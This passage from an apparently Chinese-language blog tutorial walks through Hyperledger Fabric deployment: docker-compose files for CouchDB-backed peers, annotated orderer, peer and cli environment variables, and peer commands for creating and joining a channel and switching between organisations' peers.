ORDERER_GENERAL_CLUSTER_ROOTCAS=<span class="token punctuation">[</span>/var/hyperledger/orderer/tls/ca.crt<span class="token punctuation">]</span>    <span class="token key atrule">working_dir</span><span class="token punctuation">:</span> /opt/gopath/src/github.com/hyperledger/fabric    <span class="token key atrule">command</span><span class="token punctuation">:</span> orderer    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用couch-DB数据库"><a href="#使用couch-DB数据库" class="headerlink" title="使用couch DB数据库"></a>使用couch DB数据库</h2><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># Copyright IBM Corp. All Rights Reserved.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># SPDX-License-Identifier: Apache-2.0</span><span class="token comment" spellcheck="true">#</span><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">networks</span><span class="token punctuation">:</span>  <span class="token key atrule">byfn</span><span class="token punctuation">:</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">couchdb0</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> couchdb0    <span class="token key atrule">image</span><span class="token punctuation">:</span> hyperledger/fabric<span class="token punctuation">-</span>couchdb    <span class="token comment" spellcheck="true"># Populate the COUCHDB_USER and COUCHDB_PASSWORD to set an admin user and password</span>    <span class="token comment" spellcheck="true"># for CouchDB.  This will prevent CouchDB from operating in an "Admin Party" mode.</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> COUCHDB_USER=      <span class="token punctuation">-</span> COUCHDB_PASSWORD=    <span class="token comment" spellcheck="true"># Comment/Uncomment the port mapping if you want to hide/expose the CouchDB service,</span>    <span class="token comment" spellcheck="true"># for example map it to utilize Fauxton User Interface in dev environments.</span>    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"5984:5984"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn  <span class="token key atrule">peer0.orggo.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CORE_LEDGER_STATE_STATEDATABASE=CouchDB      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=couchdb0<span class="token punctuation">:</span><span class="token number">5984</span>      <span class="token comment" spellcheck="true"># The CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME and CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD</span>      <span class="token comment" spellcheck="true"># provide the credentials for ledger to connect to CouchDB.  The username and password must</span>      <span class="token comment" spellcheck="true"># match the username and password set for the associated CouchDB.</span>      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> couchdb0  <span class="token key atrule">couchdb1</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> couchdb1    <span class="token key atrule">image</span><span class="token punctuation">:</span> hyperledger/fabric<span class="token punctuation">-</span>couchdb    <span class="token comment" spellcheck="true"># Populate the COUCHDB_USER and COUCHDB_PASSWORD to set an admin user and password</span>    <span class="token comment" spellcheck="true"># for CouchDB.  This will prevent CouchDB from operating in an "Admin Party" mode.</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> COUCHDB_USER=      <span class="token punctuation">-</span> COUCHDB_PASSWORD=    <span class="token comment" spellcheck="true"># Comment/Uncomment the port mapping if you want to hide/expose the CouchDB service,</span>    <span class="token comment" spellcheck="true"># for example map it to utilize Fauxton User Interface in dev environments.</span>    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"6984:5984"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn  <span class="token key atrule">peer1.orggo.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CORE_LEDGER_STATE_STATEDATABASE=CouchDB      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=couchdb1<span class="token punctuation">:</span><span class="token number">5984</span>      <span class="token comment" spellcheck="true"># The CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME and CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD</span>      <span class="token comment" spellcheck="true"># provide the credentials for ledger to connect to CouchDB.  The username and password must</span>      <span class="token comment" spellcheck="true"># match the username and password set for the associated CouchDB.</span>      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> couchdb1  <span class="token key atrule">couchdb2</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> couchdb2    <span class="token key atrule">image</span><span class="token punctuation">:</span> hyperledger/fabric<span class="token punctuation">-</span>couchdb    <span class="token comment" spellcheck="true"># Populate the COUCHDB_USER and COUCHDB_PASSWORD to set an admin user and password</span>    <span class="token comment" spellcheck="true"># for CouchDB.  This will prevent CouchDB from operating in an "Admin Party" mode.</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> COUCHDB_USER=      <span class="token punctuation">-</span> COUCHDB_PASSWORD=    <span class="token comment" spellcheck="true"># Comment/Uncomment the port mapping if you want to hide/expose the CouchDB service,</span>    <span class="token comment" spellcheck="true"># for example map it to utilize Fauxton User Interface in dev environments.</span>    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"7984:5984"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn  <span class="token key atrule">peer0.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CORE_LEDGER_STATE_STATEDATABASE=CouchDB      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=couchdb2<span class="token punctuation">:</span><span class="token number">5984</span>      <span class="token comment" spellcheck="true"># The CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME and CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD</span>      <span class="token comment" spellcheck="true"># provide the credentials for ledger to connect to CouchDB.  The username and password must</span>      <span class="token comment" spellcheck="true"># match the username and password set for the associated CouchDB.</span>      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> couchdb2  <span class="token key atrule">couchdb3</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> couchdb3    <span class="token key atrule">image</span><span class="token punctuation">:</span> hyperledger/fabric<span class="token punctuation">-</span>couchdb    <span class="token comment" spellcheck="true"># Populate the COUCHDB_USER and COUCHDB_PASSWORD to set an admin user and password</span>    <span class="token comment" spellcheck="true"># for CouchDB.  This will prevent CouchDB from operating in an "Admin Party" mode.</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> COUCHDB_USER=      <span class="token punctuation">-</span> COUCHDB_PASSWORD=    <span class="token comment" spellcheck="true"># Comment/Uncomment the port mapping if you want to hide/expose the CouchDB service,</span>    <span class="token comment" spellcheck="true"># for example map it to utilize Fauxton User Interface in dev environments.</span>    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"8984:5984"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> byfn  <span class="token key atrule">peer1.orgcpp.haozai.com</span><span class="token punctuation">:</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CORE_LEDGER_STATE_STATEDATABASE=CouchDB      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=couchdb3<span class="token punctuation">:</span><span class="token number">5984</span>      <span class="token comment" spellcheck="true"># The CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME and CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD</span>      <span class="token comment" spellcheck="true"># provide the credentials for ledger to connect to CouchDB.  The username and password must</span>      <span class="token comment" spellcheck="true"># match the username and password set for the associated CouchDB.</span>      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=      <span class="token punctuation">-</span> CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> couchdb3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="客户端角色使用的环境变量"><a href="#客户端角色使用的环境变量" class="headerlink" title="客户端角色使用的环境变量"></a>客户端角色使用的环境变量</h2><pre class="line-numbers language-shell"><code class="language-shell">- GOPATH=/opt/gopath# 官方配置go环境设置的gopath目录- CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock# docker的本地套接字文件, 进程间通信的- CORE_LOGGING_LEVEL=INFO# 客户端容器日志级别, 级别高写的日志越少, 默认是info- CORE_PEER_ID=cli# 客户端节点的名字, 随便起名# 这个项是需要设置的 -> 重要- CORE_PEER_ADDRESS=peer0.orggo.itcast.com:7051# 客户端节点要连接的peer节点的地址# configtx.yaml -> Organizations -> 对应的组织的组织ID- CORE_PEER_LOCALMSPID=OrgGoMSP# 连接的peer节点所属的组织的组织ID- CORE_PEER_TLS_ENABLED=true# 节点直接通信是否需要加密, true: 加密, false: 不加密# 证书路径查找方法:# crypto-config/peerOrganizations/连接的peer节点属于哪个组织(组织目录)/peers/要节点的peer节点的节点目录/tls# tls证书的路径- CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.crt# 私钥文件- CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.key# ca根证书- CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt#客户端用户角色，也要有证书。普通用户只能交易# 客户端的账号目录, 每个组织都有自己的用户账号# crypto-config/peerOrganizations/连接的peer节点属于哪个组织(组织目录)/users/各个用户账号目录/msp- CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.itcast.com/users/Admin@org1.example.com/msp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="orderer节点需要使用的环境变量"><a href="#orderer节点需要使用的环境变量" class="headerlink" title="orderer节点需要使用的环境变量"></a>orderer节点需要使用的环境变量</h2><pre class="line-numbers language-shell"><code class="language-shell"># 日志级别,critical | error | warning | notice | info | debug, 这是从高到底的顺序# docker logs 容器名/容器ID- ORDERER_GENERAL_LOGLEVEL=INFO# orderer容器日志级别- ORDERER_GENERAL_LISTENADDRESS=0.0.0.0# orderer容器绑定的地址 === order节点监听的地址# 生成创始区块的时候, 数据来源 == file, 数据来自于某一个文件- ORDERER_GENERAL_GENESISMETHOD=file- ORDERER_GENERAL_GENESISFILE=/var/hyperledger/orderer/orderer.genesis.block- ORDERER_GENERAL_LOCALMSPID=OrdererMSP# 当前orderer节点所属的组的组ID-> configtx.yaml# 当前orderer节点的账号目录- ORDERER_GENERAL_LOCALMSPDIR=/var/hyperledger/orderer/msp #当前节点的msp账号路径- ORDERER_GENERAL_TLS_ENABLED=true# 通信时候是否需要加密- ORDERER_GENERAL_TLS_PRIVATEKEY=/var/hyperledger/orderer/tls/server.key #私钥- ORDERER_GENERAL_TLS_CERTIFICATE=/var/hyperledger/orderer/tls/server.crt #证书- ORDERER_GENERAL_TLS_ROOTCAS=[/var/hyperledger/orderer/tls/ca.crt] #根证书<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="peer节点需要的环境变量"><a href="#peer节点需要的环境变量" class="headerlink" title="peer节点需要的环境变量"></a>peer节点需要的环境变量</h2><pre class="line-numbers language-shell"><code class="language-shell">- CORE_PEER_ID=peer1.org1.example.com# peer节点的名字, 随便起名, 不要和其他节点冲突- CORE_PEER_ADDRESS=peer1.org1.example.com:7051# 当前peer节点的地址# 设置是否被外部节点感知, 值就是当前节点的地址，如果不设置，别的节点就不知道改节点的存在- CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer1.org1.example.com:7051# 流言->绯闻# 数据传播给那个节点, 这个地址是当前组织中的节点的地址, 写自己的地址也可以 ,启动后会使用向改节点发送数据- CORE_PEER_GOSSIP_BOOTSTRAP=peer0.org1.example.com:7051- CORE_PEER_LOCALMSPID=Org1MSP# 当前peer所属的组的组织ID -> configtx.yaml#docker的本地套接字地址- CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock  # 对应的是docker容器启动之后加入到的网络名字# ${COMPOSE_PROJECT_NAME} == 当前配置文件所在的目录的名字- CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=${COMPOSE_PROJECT_NAME}_byfn- CORE_LOGGING_LEVEL=INFO# 日志级别- CORE_PEER_TLS_ENABLED=true# peer通信的时候是否加密# 找到当前节点的节点目录/tls/- CORE_PEER_TLS_CERT_FILE=/etc/hyperledger/fabric/tls/server.crt# tls证书- CORE_PEER_TLS_KEY_FILE=/etc/hyperledger/fabric/tls/server.key# 私钥文件- CORE_PEER_TLS_ROOTCERT_FILE=/etc/hyperledger/fabric/tls/ca.crt# ca根证书- CORE_PEER_PROFILE_ENABLED=true# 在peer节点内部又一个profile服务, 默认为true# 是不是自定选择组织内部的leader节点, true:自动, false:手动- CORE_PEER_GOSSIP_USELEADERELECTION=true# 当前节点是不是leader节点- CORE_PEER_GOSSIP_ORGLEADER=false# leader节点的选举有两种方式:#- 手动指定#当前指定的leader不能工作, 组织内部就没有可用工作的leader节点了#- 自动指定#当前指定的leader不能工作, 会重新选择一个节点作为leader节点        # 举例:# 自动# peer0.orggo- CORE_PEER_GOSSIP_USELEADERELECTION=true- CORE_PEER_GOSSIP_ORGLEADER=false# peer1.orggo- CORE_PEER_GOSSIP_USELEADERELECTION=true- CORE_PEER_GOSSIP_ORGLEADER=false# peer2.orggo- CORE_PEER_GOSSIP_USELEADERELECTION=true- CORE_PEER_GOSSIP_ORGLEADER=false# 手动 -> peer1是leader# peer0.orggo- CORE_PEER_GOSSIP_USELEADERELECTION=false- CORE_PEER_GOSSIP_ORGLEADER=false# peer1.orggo- CORE_PEER_GOSSIP_USELEADERELECTION=false- CORE_PEER_GOSSIP_ORGLEADER=true# peer2.orggo- CORE_PEER_GOSSIP_USELEADERELECTION=false- CORE_PEER_GOSSIP_ORGLEADER=false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="知识复习"><a href="#知识复习" class="headerlink" title="知识复习"></a>知识复习</h2><ol><li><p>客户端通过config.yaml 中配置的域名去访问节点</p></li><li><p>config.yaml 配置文件中包括，组织，用户，用户操作节点</p></li><li><p>通过cryptogen generate –config=crypto-config.yaml 生成证书文件</p></li><li><p>通过configtx.yaml 生成通道文件</p></li><li><p>在configtx.yaml 中配置组织的证书目录</p></li><li><p>在configtx.yaml中，配置锚节点</p></li><li><p>在configtx中配置排序节点</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20220304143805230.png" alt="image-20220304143805230"></p></li></ol><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20220304160410917.png" alt="image-20220304160410917"></p><p>启动结束后：</p><pre><code>CONTAINER ID   IMAGE                               COMMAND             CREATED         STATUS         PORTS                                  NAMES74b0dfaf4e30   hyperledger/fabric-tools:latest     "/bin/bash"         2 minutes ago   Up 2 minutes                                          cli767e394fe4cb   hyperledger/fabric-orderer:latest   "orderer"           2 minutes ago   Up 2 minutes   0.0.0.0:7050-&gt;7050/tcp                 orderer.haozai.comc36ccbe0e43a   hyperledger/fabric-peer:latest      "peer node start"   2 minutes ago   Up 2 minutes   0.0.0.0:8051-8052-&gt;8051-8052/tcp       peer1.orggo.haozai.com14194e6ade5a   hyperledger/fabric-peer:latest      "peer node start"   2 minutes ago   Up 2 minutes   0.0.0.0:10051-10052-&gt;10051-10052/tcp   peer1.orgcpp.haozai.com3b6a5e4bd7fd   hyperledger/fabric-peer:latest      "peer node start"   2 minutes ago   Up 2 minutes   0.0.0.0:9051-9052-&gt;9051-9052/tcp       peer0.orgcpp.haozai.com59cd3ed96c75   hyperledger/fabric-peer:latest      "peer node start"   2 minutes ago   Up 2 minutes   0.0.0.0:7051-7052-&gt;7051-7052/tcp       peer0.orggo.haozai.com</code></pre><h2 id="客户端操作各节点"><a href="#客户端操作各节点" class="headerlink" title="客户端操作各节点"></a>客户端操作各节点</h2><ul><li>创建通道<ul><li>进入到客户端对应的容器中</li></ul></li><li>将每个组织的每个节点都加入到通道中 -&gt;  客户端来完成<ul><li>一个客户端同时只能连接一个PEER节点</li></ul></li><li>给每个PEER节点安装智能合约 —&gt; （程序：GO,JAVA）</li><li>对智能合约进行初始化，对应智能合约中init函数<ul><li>只需要在任意节点初始化一次,数据会自动同步</li></ul></li><li>对数据进行查询 —&gt;读</li><li>对数据进行调用 —-&gt;写</li></ul><h3 id="1、创建通道"><a href="#1、创建通道" class="headerlink" title="1、创建通道"></a>1、创建通道</h3><pre class="line-numbers language-shell"><code class="language-shell">#进入cli客户端docker exec -it cli /bin/bash  #创建通道文件peer channel  create -o orderer节点地址:端口 -c 通道名 -f 通道文件 --tls true --cafile orderer节点pem格式的证书文件  #order节点地址可以是 IP或者域名  #orderer 节点监听的7050端口  #在创建通道文件的时候指明的通道ID  #orderPem在cli终端找  #orderPem证书文件的路径 : /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/haozai.com/msp/tlscacertspeer channel  create -o orderer.haozai.com:7050 -c haozaichannel -f ./channel-artifacts/channel.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/haozai.com/msp/tlscacerts/tlsca.haozai.com-cert.pempeer channel  create -o orderer.food.com:7050 -c foodfchannel -f ./channel-artifacts/test.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/food.com/msp/tlscacerts/tlsca.food.com-cert.pem#成功后，会在当前目录生成*.block文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、加入到通道中"><a href="#2、加入到通道中" class="headerlink" title="2、加入到通道中"></a>2、加入到通道中</h3><pre class="line-numbers language-shell"><code class="language-shell">peer channel join -b haozaichannel.blockpeer channel list #查看通道信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="切换节点"><a href="#切换节点" class="headerlink" title="切换节点"></a>切换节点</h4><p>只需要修改cli的环境变量</p><pre class="line-numbers language-shell"><code class="language-shell">#切换到peer0.orggo.haozai.com export CORE_PEER_ID=peer0.orggo.haozai.com      export CORE_PEER_ADDRESS=peer0.orggo.haozai.com:7051      export CORE_PEER_LOCALMSPID=OrgGoMSP      export CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/peers/peer0.orggo.haozai.com/tls/server.crt     export CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/peers/peer0.orggo.haozai.com/tls/server.key     export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/peers/peer0.orggo.haozai.com/tls/ca.crt     export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/users/Admin@orggo.haozai.com/msp     #切换到peer1.orggo的节点    export CORE_PEER_ID=peer1.orggo.haozai.com      export CORE_PEER_ADDRESS=peer1.orggo.haozai.com:8051      export CORE_PEER_LOCALMSPID=OrgGoMSP      export CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/peers/peer1.orggo.haozai.com/tls/server.crt     export CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/peers/peer1.orggo.haozai.com/tls/server.key     export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/peers/peer1.orggo.haozai.com/tls/ca.crt     export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orggo.haozai.com/users/Admin@orggo.haozai.com/msp     #切换到peer0.orgcpp的节点  export CORE_PEER_ID=peer0.orgcpp.haozai.com      export CORE_PEER_ADDRESS=peer0.orgcpp.haozai.com:9051      export CORE_PEER_LOCALMSPID=OrgCppMSP      export CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/peers/peer0.orgcpp.haozai.com/tls/server.crt     export CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/peers/peer0.orgcpp.haozai.com/tls/server.key     export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/peers/peer0.orgcpp.haozai.com/tls/ca.crt     export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/users/Admin@orgcpp.haozai.com/msp#切换到peer1.orgcpp的节点       export CORE_PEER_ID=peer1.orgcpp.haozai.com      export CORE_PEER_ADDRESS=peer1.orgcpp.haozai.com:10051      export CORE_PEER_LOCALMSPID=OrgCppMSP      export CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/peers/peer1.orgcpp.haozai.com/tls/server.crt     export CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/peers/peer1.orgcpp.haozai.com/tls/server.key     export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/peers/peer1.orgcpp.haozai.com/tls/ca.crt     export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/users/Admin@orgcpp.haozai.com/msp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">#切换到peer0.org1.food.com export CORE_PEER_ID=peer0.org1.food.com      export CORE_PEER_ADDRESS=peer0.org1.food.com:7051      export CORE_PEER_LOCALMSPID=Org1MSP      export CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.food.com/peers/peer0.org1.food.com/tls/server.crt     export CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.food.com/peers/peer0.org1.food.com/tls/server.key     export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.food.com/peers/peer0.org1.food.com/tls/ca.crt     export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.food.com/users/Admin@org1.food.com/msp     #切换到org2的节点    export CORE_PEER_ID=peer0.org2.food.com      export CORE_PEER_ADDRESS=peer0.org2.food.com:8051      export CORE_PEER_LOCALMSPID=Org2MSP      export CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.food.com/peers/peer0.org2.food.com/tls/server.crt     export CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.food.com/peers/peer0.org2.food.com/tls/server.key     export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.food.com/peers/peer0.org2.food.com/tls/ca.crt     export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.food.com/users/Admin@org2.food.com/msp     #切换到org3的节点  export CORE_PEER_ID=peer0.org3.food.com      export CORE_PEER_ADDRESS=peer0.org3.food.com:9051      export CORE_PEER_LOCALMSPID=Org3MSP      export CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org3.food.com/peers/peer0.org3.food.com/tls/server.crt     export CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org3.food.com/peers/peer0.org3.food.com/tls/server.key     export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org3.food.com/peers/peer0.org3.food.com/tls/ca.crt     export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org3.food.com/users/Admin@org3.food.com/msp#切换到org4的节点       export CORE_PEER_ID=peer0.org4.food.com      export CORE_PEER_ADDRESS=peer0.org4.food.com:10051      export CORE_PEER_LOCALMSPID=Org4MSP      export CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org4.food.com/peers/peer0.org4.food.com/tls/server.crt     export CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org4.food.com/peers/peer0.org4.food.com/tls/server.key     export CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org4.food.com/peers/peer0.org4.food.com/tls/ca.crt     export CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org4.food.com/users/Admin@org4.food.com/msp<span aria-hidden="true" 